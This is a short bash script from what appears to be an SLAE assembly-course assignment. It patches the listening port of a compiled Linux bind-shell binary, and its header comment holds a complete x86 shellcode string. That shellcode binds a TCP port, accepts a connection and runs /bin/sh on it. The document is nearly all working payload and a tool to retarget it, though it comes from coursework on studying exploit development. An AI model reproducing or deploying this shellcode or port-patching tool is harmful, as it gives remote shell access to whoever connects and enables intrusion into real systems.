#!/bin/bash

#Description:	Assignment #1 (Shell_Bind_TCP, configure port)
#Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x90\x34\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
#Author: 		Paolo Stivanin <https://github.com/polslinux>
#SLAE ID:		526

if [ -z "$1" ]; then
	echo "Usage: $0 <elf-file>"
	exit -1
fi

oldport=$(od -t x1 $1|grep -o -P "66 68.{6}"|sed 's/\(......\)//g'|sed 's/\ //g')
hexoldport=$(printf '%s' $oldport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')

echo "--> Write port number: "
read port
hexport=$(printf '%x' $port)

echo "[+] HEX code of choosed port: $hexport"

echo "[+] Updating $1 elf..."
newport=$(printf '%s' $hexport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')
sed -i "s/\x66\x68$hexoldport/\x66\x68$newport/g" $1

echo "[+] All done :)"